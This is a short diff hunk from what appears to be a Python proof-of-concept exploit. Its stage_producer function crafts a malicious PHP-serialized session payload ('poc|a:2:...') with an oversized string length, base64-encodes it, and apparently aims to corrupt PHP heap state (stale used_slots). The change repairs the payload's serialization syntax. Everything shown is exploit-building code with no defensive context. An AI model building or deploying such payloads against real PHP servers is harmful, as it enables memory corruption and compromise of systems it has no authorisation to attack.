@@ -101,7 +101,7 @@ def stage_producer(kind, sid):
     own WALKOK string (self-resolve) iff the stale used_slots survived."""
     head = b"".join(b"p%d|" % i + b's:%d:"' % len(MARKERS[i]) + MARKERS[i] + b'";'
                     for i in range(12)) + \
-           b'poc|a:2:{i:0;' + b's:3:"abc"' + b'i:1;s:%d:"' % BIG
+           b'poc|a:2:{i:0;s:3:"abc";i:1;s:%d:"' % BIG
     h64 = subprocess.run(["base64", "-w0"], input=head,
                          capture_output=True).stdout.decode()
     t64 = subprocess.run(["base64", "-w0"], input=b'";}',
